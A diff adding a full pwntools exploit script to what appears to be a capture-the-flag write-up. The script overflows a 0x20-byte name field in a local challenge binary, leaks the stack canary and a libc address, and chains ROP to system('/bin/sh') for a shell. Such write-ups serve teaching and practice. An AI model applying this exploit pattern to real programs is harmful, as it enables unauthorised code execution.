@@ -162,3 +162,77 @@ The name in MinerAccount object was assigned to only 0x20 size, but in change_na
 6) Leak canary
 7) Leak libc_start_main address
 8) Proceed will rop chain to system
+
+<details>
+<summary>Exploit Script</summary>
+
+```py
+from pwn import *
+
+exe = './prob'
+elf = context.binary = ELF(exe, checksec = False)
+io = elf.process()
+
+context.log_level = 'info'
+
+#---------------------------------------------------------------------
+sleep(1)
+#io.recvuntil(b'Choose an action.\n')
+io.sendline(b'1')
+#io.recvuntil(b'How much loan would you like to request?\n')
+io.sendline(b'16777216')
+
+#io.recvuntil(b'Choose an action.\n')
+io.sendline(b'4')
+
+
+for i in range(1337):
+#	io.recvuntil(b'Choose an action.\n')
+	io.sendline(b'1')
+#	io.recvuntil(b'How much loan would you like to request?\n')
+	io.sendline(b'1')
+
+io.recvuntil(b'Choose an action.\n')
+io.sendline(b'2')
+io.recvuntil(b'How much would you like to repay?\n')
+io.sendline(b'16777216')
+
+io.recvuntil(b'Choose an action.')
+io.sendline(b'5')
+io.recvuntil(b'Enter new name.')
+io.sendline(b'A'*44)
+
+io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
+canary = io.recv(7).strip()
+canary = b'\x00'+canary
+canary = unpack(canary)
+info(f'Canary: {hex(canary)}')
+
+io.recvuntil(b'Choose an action.')
+io.sendline(b'5')
+io.recvuntil(b'Enter new name.')
+io.sendline(b'A'*59)
+io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
+libc_add = unpack(io.recv(6).strip().ljust(8,b'\x00'))
+info(f'libc leaked : {hex(libc_add)}')
+
+io.recvuntil(b'Choose an action.')
+io.sendline(b'5')
+io.recvuntil(b'Enter new name.')
+
+libc = ELF('./libc.so.6')
+libc.address = libc_add-0x29d90
+rop = ROP(libc)
+rop.system(next(libc.search(b'/bin/sh\x00')))
+
+payload = b'A'*44
+payload += p64(canary)
+payload += b'A'*8
+payload += p64(libc.address + 0x0000000000029cd6)
+payload += rop.chain()
+io.sendline(payload)
+
+#--------------------------------------------------------------------
+io.interactive()
+```
+</details>
